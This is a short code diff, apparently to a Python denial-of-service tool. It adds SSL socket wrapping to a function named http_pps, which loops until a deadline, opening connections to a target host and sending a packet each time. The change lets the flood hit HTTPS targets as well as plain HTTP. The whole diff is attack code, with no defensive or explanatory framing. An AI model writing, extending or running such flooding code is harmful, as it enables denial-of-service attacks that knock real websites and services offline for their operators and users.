@@ -8,6 +8,7 @@ import requests
 import random
 import threading
 import time
+import ssl
 import json
 import traceback
 import socks
@@ -124,6 +125,8 @@ def http_pps(url, until):
     while until > time.time():
         sock = socket.socket()
         sock.connect((url.hostname, int(url.port)))
+        if url.scheme == "https":
+            sock = ssl.wrap_socket(sock)
         sock.send(packet.encode())
         sock.close()
 
